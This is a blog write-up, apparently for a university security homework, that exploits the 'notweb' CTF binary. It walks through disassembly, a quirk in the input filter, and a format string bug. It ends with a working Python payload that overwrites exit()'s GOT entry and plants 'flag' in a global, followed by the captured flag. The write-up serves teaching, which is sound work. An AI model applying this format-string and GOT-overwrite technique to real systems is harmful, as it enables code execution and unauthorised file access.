---
layout: post
title: 'notweb Writeup'
category: memo
slug: notweb-writeup
---
Security Programming Homework 3-2

## Finding Weak Points

After using gdb to do the dynamic analysis, I found that function `main()`
will call function `get_request()`. So I set the break point at the line
which calls `get_request()` and check it out step by step. The program calls
`fgets()` to get the input, and using `strtok()` to chop the string
according to the spaces. If the whold string only consists of one single word,
it calls exit to terminate the program. Otherwise the program will go on.

```nasm
08048a51:       89 45 ec                mov    DWORD PTR [ebp-0x14],eax
08048a54:       83 7d ec 00             cmp    DWORD PTR [ebp-0x14],0x0
08048a58:       75 0c                   jne    8048a66 <get_request+0x90>
08048a5a:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
08048a61:       e8 ea fb ff ff          call   8048650 <exit@plt>
```

The variable `buf` sucks in the whole line of input then splits the input
into tokens according to space and colon. A diagram is showed below:

```
ORIGINAL INPUT:

GET /echo:%x%x%x%x%x
|   |     |
|   |     v
|   v     stored in local variable in ``main()``, using ``s`` as example
v   length of the string is 5, the first character is stored in ``file``
abandoned
```

And there is a piece of code that contains `printf(buf)` in the function
`echo()`. With this, exploiting the vulnerability of format string to leak
arbitrary memory is easy. Even write some values into memory could be possible.

## Weird Filter

In `get_request()`, the first n bytes of global variable `buf` will be
eliminated before return. This will make the second for loop in
`filter_format()` has no effect. Because the first n bytes of global variable
`buf` are already been cleared with zeros, the length of the string is zero.
Thus the for loop will ended up immediately. As a result, the global `buf`
remains, '%' is not replaced with '\_'.

In function `echo()`, after calling `filter_format()`, the string which is
after ':' ('%' have already been replaced with '\_') will be copied to the front
end of the global variable `buf`. This could make the string which is after
':' of the global variable `buf` ('%' are not replaced with '\_') being
overlaped. So extra calculation must be taken to assure the target string not
being messed, if someone want to exploit the program using format string.

According to the example string which is entered into the program, the value in
the global variable `buf` before calling `printf(buf)` in function
`echo()` is:

```
_x_x_x_x_x\nx%x%x%x%x\n
```

The result showed up is:

```
_x_x_x_x_x
xfffe4f4cbf7f4b3d00
```

If the length of the string after ':' (including '\n') is exactly 10, it can
overwrite the byte which contains ':' (':' is replaced with string terminator
because of `strtok`). In the end, the whole string is connected again, rear
part is our original format string.

Padding some trival characters between ':' and the format string to ensure to
connect the global variable `buf` again, if the lenth of the string is less
than 10.

```
GET /echo:aaaaaaa%p
```

For the string which is longer than 10, one must pad some trival characters to
make sure the format string won't be covered by something useless by the
fxxking program logic.

```
GGET /echo:%p%p%p%p%p
```

## Objective

The return address is at `$esp+0x1c` in `echo()`, that is to say, using
`%7$p` could leak the return address (of course the length must be at least
10 characters). Our objective is to modify the address (0x0804917f) with the
address of function `normal_file()` (0x08048c8f). Besides, the content of the
global variable `file` should be "flag". With all of this, the function
`normal_file()` can have the ability of opening the file of the flag and
reading that file. The gods send nut to those who have no teeth, the server
side has already enabled ASLR, so we cannot know the location of the return
address in the stack. Thus, exploitation using format string to overwrite the
return address in the stack is not practical.

However, there's another way to control the `eip` though the return address
cannot be modified. The Global Offset Table (GOT) might be a good candidate.
The offset of the function `fflush()` in the GOT is 0x0804b018. The content
in that is the actual position of `fflush()` (0xf7e78760) after GLIBC was
dynamically loaded into the program. So we just have to replace the address
with the address of `normal_file()`. But again, the gods send nut to those
who have no theeth, there is a `fflush()` in the function `normal_file()`.
So doing this will cause an endless loop. A better choice is to modify the
address of the function `exit()` in the GOT to avoid that. The offset of the
function `exit()` in the GOT is 0x0804b03c.

```bash
$ readelf -r notweb

Relocation section '.rel.dyn' at offset 0x49c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
 0804affc  00000c06 R_386_GLOB_DAT    00000000   __gmon_start__
 0804b080  00001805 R_386_COPY        0804b080   stdin
 0804b0a0  00001605 R_386_COPY        0804b0a0   stdout

Relocation section '.rel.plt' at offset 0x4b4 contains 21 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
 0804b00c  00000107 R_386_JUMP_SLOT   00000000   strstr
 0804b010  00000207 R_386_JUMP_SLOT   00000000   strcmp
 0804b014  00000307 R_386_JUMP_SLOT   00000000   printf
 0804b018  00000407 R_386_JUMP_SLOT   00000000   fflush
 0804b01c  00000507 R_386_JUMP_SLOT   00000000   memcpy
 0804b020  00000607 R_386_JUMP_SLOT   00000000   bzero
 0804b024  00000707 R_386_JUMP_SLOT   00000000   fgets
 0804b028  00000807 R_386_JUMP_SLOT   00000000   fclose
 0804b02c  00000907 R_386_JUMP_SLOT   00000000   chdir
 0804b030  00000a07 R_386_JUMP_SLOT   00000000   fseek
 0804b034  00000b07 R_386_JUMP_SLOT   00000000   fread
 0804b038  00000c07 R_386_JUMP_SLOT   00000000   __gmon_start__
 0804b03c  00000d07 R_386_JUMP_SLOT   00000000   exit
 0804b040  00000e07 R_386_JUMP_SLOT   00000000   strlen
 0804b044  00000f07 R_386_JUMP_SLOT   00000000   __libc_start_main
 0804b048  00001007 R_386_JUMP_SLOT   00000000   write
 0804b04c  00001107 R_386_JUMP_SLOT   00000000   ftell
 0804b050  00001207 R_386_JUMP_SLOT   00000000   fopen
 0804b054  00001307 R_386_JUMP_SLOT   00000000   strncpy
 0804b058  00001407 R_386_JUMP_SLOT   00000000   strtok
 0804b05c  00001507 R_386_JUMP_SLOT   00000000   sprintf
```

Besides controlling the `eip`, the global variable `file` should be set to
the string "flag", too.

## Exploitation

The key point is that how to design the payload and keep the original format
string from destroying by the filter. The following is the main part of the
exploitation code.

```python
# exit()'s offset in GOT showed up in stack fram
# normal_file() @ 0x08048c8f
# total 16 bytes
addr1  = struct.pack('<I', 0x0804b03c) # 0x8f
addr1 += struct.pack('<I', 0x0804b03d) # 0x8c
addr1 += struct.pack('<I', 0x0804b03e) # 0x04
addr1 += struct.pack('<I', 0x0804b03f) # 0x08

# file's address showed up in stack frame
# file @ 0x080637e0
# total 16 bytes
addr2  = struct.pack('<I', 0x080637e0) # 'f': 0x66 102
addr2 += struct.pack('<I', 0x080637e1) # 'l': 0x6c
addr2 += struct.pack('<I', 0x080637e2) # 'a': 0x61
addr2 += struct.pack('<I', 0x080637e3) # 'g': 0x67

inject1 = '%7c%15$hhn%253c%16$hhn%120c%17$hhn%4c%18$hhn' # 44 bytes
inject2 = '%78c%30$hhn%6c%31$hhn%245c%32$hhn%6c%33$hhna' # 44 bytes

padding = 'G'*110

payload = padding + 'GET /echo:' + addr1 + inject1 + addr2 + inject2 + '\n'
```

## Flag

The flag is:

```
SECPROG{But_PWN_!s_e@sier_th@n_WEB_XDDDD}
```
